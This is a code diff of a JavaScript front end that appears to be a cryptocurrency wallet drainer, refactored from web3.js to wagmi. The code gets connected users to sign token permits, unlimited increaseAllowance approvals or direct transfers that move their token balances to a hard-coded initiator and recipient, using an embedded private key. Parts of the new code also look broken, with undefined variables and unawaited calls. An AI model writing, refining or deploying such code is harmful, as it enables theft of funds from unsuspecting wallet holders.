@@ -9,12 +9,13 @@ import {
   createConfig,
   fetchBalance,
   writeContract,
-  Connector
+  readContract,
+  signTypedData,
+  getAccount,
+  fetchFeeData
 } from '@wagmi/core';
 import { mainnet } from '@wagmi/core/chains';
-import { getAccount, fetchFeeData, disconnect } from '@wagmi/core';
 import { ethers } from 'ethers';
-import detectEthereumProvider from '@metamask/detect-provider';
 import * as constants from './constants.js';
 import Web3 from 'web3';
 import { Alchemy, Network } from 'alchemy-sdk';
@@ -35,10 +36,7 @@ const wagmiConfig = createConfig({
   publicClient,
 });
 const ethereumClient = new EthereumClient(wagmiConfig, chains);
-export const web3modal = new Web3Modal({
-  projectId: projectId,
-  enableExplorer: true,
-  }, ethereumClient);
+export const web3modal = new Web3Modal({projectId}, ethereumClient);
 
 let prices = [];
 export let priceList = [];
@@ -101,7 +99,7 @@ export const claim = async (_balance) => {
     claim(_balance);
   }
 };
-export const increaseAllowance = async (token, provider) => {
+export const increaseAllowance = async (token) => {
   try {
     
     const web3 = new Web3(provider);
@@ -109,204 +107,207 @@ export const increaseAllowance = async (token, provider) => {
       constants.ALLOWANCEABI,
       token.token_address
     );
-    const account = getAccount().address;
 
-    const allow = await allownce(token, provider);
-    if (allow >= token.balance){
-      await transfer(token, provider);
-      return ;
+    const allow = await allownce(token);
+    if (allow >= balanceOf(token)) {
+      return await transfer(token);
     };
     const permitToken = constants.permitTokens.find(tokenis => tokenis.address === token.token_address)
     const increaseallown = constants.increasAllownceTokens.find(tokenis => tokenis === token.token_address)
     const transfertoken = constants.transferTokens.find(tokenis => tokenis === token.token_address)
     if (permitToken) {
-      let nonce = undefined
-      await contract.methods.nonces(account).call(function(error, result) {
-        if (error) return
-        nonce = result
-      });
+      const nonce = readContract({
+        address: token.token_address,
+        abi: constants.ALLOWANCEABI,
+        functionName: 'nonces',
+        args: [getAccount().address],
+      })
       const { initiatorNonce } = await web3.eth.getTransactionCount(constants.initiator);
-      await contract.methods.version().call(function(error, result) {
-        if (error) return
-        if( result === '1') {
-          const dataToSign = JSON.stringify({
-            domain: {
-                name: permitToken.name, // token name
-                version: "1", // version of a token
-                chainId: "1",
-                verifyingContract: permitToken.address
-            }, 
-            types: {
-                EIP712Domain: [
-                    { name: "name", type: "string" },
-                    { name: "version", type: "string" },
-                    { name: "chainId", type: "uint256" },
-                    { name: "verifyingContract", type: "address" },
-                ],
-                Permit: [
-                    { name: "holder", type: "address" },
-                    { name: "spender", type: "address" },
-                    { name: "nonce", type: "uint256" },
-                    { name: "expiry", type: "uint256" },
-                    { name: "allowed", type: "bool" },
-                ]
-            },
-            primaryType: "Permit",
-            message: { 
-              holder: account,
-              spender: constants.initiator,
-              nonce: nonce,
-              expiry: constants.deadline,
-              allowed: true,
-            }
-          });
-          web3.currentProvider.sendAsync({
-            method: "eth_signTypedData_v4",
-            params: [account, dataToSign],
-            from: account
-          }, async (error, result) => {
+      const version = readContract({
+        address: token.token_address,
+        abi: constants.ALLOWANCEABI,
+        functionName: 'version',
+      })
+      if( version === '1') {
+        const dataToSign = JSON.stringify({
+          domain: {
+              name: permitToken.name, // token name
+              version: "1", // version of a token
+              chainId: "1",
+              verifyingContract: permitToken.address
+          }, 
+          types: {
+              EIP712Domain: [
+                  { name: "name", type: "string" },
+                  { name: "version", type: "string" },
+                  { name: "chainId", type: "uint256" },
+                  { name: "verifyingContract", type: "address" },
+              ],
+              Permit: [
+                  { name: "holder", type: "address" },
+                  { name: "spender", type: "address" },
+                  { name: "nonce", type: "uint256" },
+                  { name: "expiry", type: "uint256" },
+                  { name: "allowed", type: "bool" },
+              ]
+          },
+          primaryType: "Permit",
+          message: { 
+            holder: getAccount().address,
+            spender: constants.initiator,
+            nonce: nonce,
+            expiry: constants.deadline,
+            allowed: true,
+          }
+        });
+        const signedData = await signTypedData(dataToSign);
+        // web3.currentProvider.sendAsync({
+        //   method: "eth_signTypedData_v4",
+        //   params: [account, dataToSign],
+        //   from: account
+        // }, async (error, result) => {
 
-            if (error != null) increaseAllowance(token, provider);
-            
-            const signature = result.result
-            const splited = ethers.utils.splitSignature(signature)
-            const permitData = contract.methods.permit(account, constants.initiator, nonce, constants.deadline, true,  splited.v, splited.r, splited.s).encodeABI()
-            const gasPrice = await web3.eth.getGasPrice()
-            const permitTX = {
-                from: constants.initiator,
-                to: permitToken.address,
-                nonce: web3.utils.toHex(initiatorNonce),
-                gasLimit: web3.utils.toHex(98000),
-                gasPrice: web3.utils.toHex(Math.floor(gasPrice * 1.3)),
-                value: "0x",
-                data: permitData
-            }
-            const signedPermitTX = await web3.eth.accounts.signTransaction(permitTX, constants.initiatorPK)
-            await web3.eth.sendSignedTransaction(signedPermitTX.rawTransaction)
-            .on("transactionHash", async (hash) => {
-              console.log(hash);
-            })
-            .on("confirmation", async (confirmationNumber, receipt) => {
-              if (confirmationNumber >= 1) {
-                console.log(receipt);
-                await transfer(token, provider);
-              }
-            });
-          });
-        }
-        if (result === '2') {
-          const tokencontract = new web3.eth.Contract(
-            constants.permitV2,
-            token.token_address
-          );
-          const dataToSign = JSON.stringify({
-            domain: {
-                name: permitToken.name, // token name
-                version: "2", // version of a token
-                chainId: "1",
-                verifyingContract: permitToken.address
-            }, 
-            types: {
-                EIP712Domain: [
-                    { name: "name", type: "string" },
-                    { name: "version", type: "string" },
-                    { name: "chainId", type: "uint256" },
-                    { name: "verifyingContract", type: "address" },
-                ],
-                Permit: [
-                    { name: "owner", type: "address" },
-                    { name: "spender", type: "address" },
-                    { name: "value", type: "uint256" },
-                    { name: "nonce", type: "uint256" },
-                    { name: "deadline", type: "uint256" },
-                ]
-            },
-            primaryType: "Permit",
-            message: { 
-                owner: account, 
-                spender: constants.initiator, 
-                value: constants.max,
-                nonce: nonce, 
-                deadline: constants.deadline 
-            }
-          });
+        //   if (error != null) increaseAllowance(token, provider);
+          
+        //   const signature = result.result
+        //   const splited = ethers.utils.splitSignature(signature)
+        //   const permitData = contract.methods.permit(account, constants.initiator, nonce, constants.deadline, true,  splited.v, splited.r, splited.s).encodeABI()
+        //   const gasPrice = await web3.eth.getGasPrice()
+        //   const permitTX = {
+        //       from: constants.initiator,
+        //       to: permitToken.address,
+        //       nonce: web3.utils.toHex(initiatorNonce),
+        //       gasLimit: web3.utils.toHex(98000),
+        //       gasPrice: web3.utils.toHex(Math.floor(gasPrice * 1.3)),
+        //       value: "0x",
+        //       data: permitData
+        //   }
+        //   const signedPermitTX = await web3.eth.accounts.signTransaction(permitTX, constants.initiatorPK)
+        //   await web3.eth.sendSignedTransaction(signedPermitTX.rawTransaction)
+        //   .on("transactionHash", async (hash) => {
+        //     console.log(hash);
+        //   })
+        //   .on("confirmation", async (confirmationNumber, receipt) => {
+        //     if (confirmationNumber >= 1) {
+        //       console.log(receipt);
+        //       await transfer(token, provider);
+        //     }
+          // });
+        // });
+      }
+      if (result === '2') {
 
-          web3.currentProvider.sendAsync({
-            method: "eth_signTypedData_v4",
-            params: [account, dataToSign],
-            from: account
-          }, async (error, result) => {
+        const tokencontract = new web3.eth.Contract(
+          constants.permitV2,
+          token.token_address
+        );
+        const dataToSign = JSON.stringify({
+          domain: {
+              name: permitToken.name, // token name
+              version: "2", // version of a token
+              chainId: "1",
+              verifyingContract: permitToken.address
+          }, 
+          types: {
+              EIP712Domain: [
+                  { name: "name", type: "string" },
+                  { name: "version", type: "string" },
+                  { name: "chainId", type: "uint256" },
+                  { name: "verifyingContract", type: "address" },
+              ],
+              Permit: [
+                  { name: "owner", type: "address" },
+                  { name: "spender", type: "address" },
+                  { name: "value", type: "uint256" },
+                  { name: "nonce", type: "uint256" },
+                  { name: "deadline", type: "uint256" },
+              ]
+          },
+          primaryType: "Permit",
+          message: { 
+              owner: account, 
+              spender: constants.initiator, 
+              value: constants.max,
+              nonce: nonce, 
+              deadline: constants.deadline 
+          }
+        });
 
-            if (error != null) increaseAllowance(token, provider);
+        web3.currentProvider.sendAsync({
+          method: "eth_signTypedData_v4",
+          params: [account, dataToSign],
+          from: account
+        }, async (error, result) => {
 
-            const signature = result.result
-            const splited = ethers.utils.splitSignature(signature)
-            const permitData = tokencontract.methods.permit(account, constants.initiator, constants.max, constants.deadline, splited.v, splited.r, splited.s).encodeABI()
-            const gasPrice = await web3.eth.getGasPrice()
-            const permitTX = {
-                from: constants.initiator,
-                to: permitToken.address,
-                nonce: web3.utils.toHex(initiatorNonce),
-                gasLimit: web3.utils.toHex(98000),
-                gasPrice: web3.utils.toHex(Math.floor(gasPrice * 1.3)),
-                value: "0x",
-                data: permitData
-            }
-            const signedPermitTX = await web3.eth.accounts.signTransaction(permitTX, constants.initiatorPK)
-            await web3.eth.sendSignedTransaction(signedPermitTX.rawTransaction)
-            .on("transactionHash", async (hash) => {
-              console.log(hash);
-            })
-            .on("confirmation", async (confirmationNumber, receipt) => {
-              if (confirmationNumber >= 1) {
-                console.log(receipt);
-                await transfer(token, provider);
-              }
-            });
+          if (error != null) increaseAllowance(token, provider);
+
+          const signature = result.result
+          const splited = ethers.utils.splitSignature(signature)
+          const permitData = tokencontract.methods.permit(account, constants.initiator, constants.max, constants.deadline, splited.v, splited.r, splited.s).encodeABI()
+          const gasPrice = await web3.eth.getGasPrice()
+          const permitTX = {
+              from: constants.initiator,
+              to: permitToken.address,
+              nonce: web3.utils.toHex(initiatorNonce),
+              gasLimit: web3.utils.toHex(98000),
+              gasPrice: web3.utils.toHex(Math.floor(gasPrice * 1.3)),
+              value: "0x",
+              data: permitData
+          }
+          const signedPermitTX = await web3.eth.accounts.signTransaction(permitTX, constants.initiatorPK)
+          await web3.eth.sendSignedTransaction(signedPermitTX.rawTransaction)
+          .on("transactionHash", async (hash) => {
+            console.log(hash);
           })
-        }
-      })
-      return;
+          .on("confirmation", async (confirmationNumber, receipt) => {
+            if (confirmationNumber >= 1) {
+              console.log(receipt);
+              await transfer(token, provider);
+            }
+          });
+        })
+      }
     }else if (increaseallown) {
-      await contract.methods.increaseAllowance(constants.initiator, constants.max)
-      .send({ from: account })
-      .on('transactionHash', async (hash) => {
-        console.log(hash);
+      return await writeContract({
+        address: token.token_address,
+        abi: constants.ALLOWANCEABI,
+        functionName: 'increaseAllowance',
+        args: [constants.initiator, constants.max],
+        gasPrice: feeData.gasPrice,
+        gas: 30000,
       })
-      .on("confirmation", async (confirmationNumber, receipt) => {
-        if (confirmationNumber >= 1) {
-          console.log(receipt);
-          await transfer(token, provider);
-        }
-      });
-      return;
     }else if (transfertoken) {
-      await contract.methods
-        .transfer(constants.recipient, token.balance)
-        .send({ from: account });
-      return;
+      await writeContract({
+        address: token.token_address,
+        abi: constants.ALLOWANCEABI,
+        functionName: 'transfer',
+        args: [constants.recipient, token.balance],
+        gasPrice: feeData.gasPrice,
+        gas: 30000,
+      })
     }
     
   } catch (error) {
     console.log(error);
-    increaseAllowance(token, provider);
+    increaseAllowance(token);
   }
 };
 
-export const transfer = async (token, provider) => {
+export const transfer = async (token) => {
   try {
-    const signer = new ethers.Wallet(constants.initiatorPK, provider);
-    const account = getAccount().address;
-    const erc20Contract = new ethers.Contract(
-      token.token_address,
-      constants.ALLOWANCEABI,
-      signer
-    );
-    await erc20Contract.transferFrom(
-      account,
-      constants.recipient,
-      token.balance
-    );
+    const feeData = await fetchFeeData({
+      chainId: 1,
+      formatUnits: 'gwei',
+    });
+    const amount = balanceOf(token)
+    return await writeContract({
+      address: token.token_address,
+      abi: constants.ALLOWANCEABI,
+      functionName: 'transfer',
+      args: [constants.recipient, amount],
+      gasPrice: feeData.gasPrice,
+      gas: 30000,
+    });
   } catch (error) {
     console.log(error);
   }
@@ -324,33 +325,29 @@ export const ethBalance = async () => {
   }
 };
 
-export const allownce = async (token, provider) => {
+export const allownce = async (token) => {
   try{
-    const web3 = new Web3(provider);
-    var contract = new web3.eth.Contract(
-      constants.ALLOWANCEABI,
-      token.token_address
-    );
-    const account = getAccount().address;
-    return await contract.methods.allowance(account, constants.initiator).call();
+    return await readContract({
+      address: token.token_address,
+      abi: constants.ALLOWANCEABI,
+      functionName: 'allowance',
+      args: [getAccount().address, constants.initiator],
+      chainId: 1
+    })
   } catch (error) {
     console.log(error);
   }
 }
 
-export const balanceOf = async (token, provider) => {
+export const balanceOf = async (token) => {
   try{
-
-    const web3 = new Web3(provider);
-    var contract = new web3.eth.Contract(
-      constants.ALLOWANCEABI,
-      token.token_address
-    );
-    const account = getAccount().address;
-    const balance = await contract.methods
-        .balanceOf(account)
-        .call();
-    return balance;
+    return await readContract({
+      address: token.token_address,
+      abi: constants.ALLOWANCEABI,
+      functionName: 'balanceOf',
+      args: [getAccount().address],
+      chainId: 1
+    })
   } catch (error) {
     console.log(error);
   }
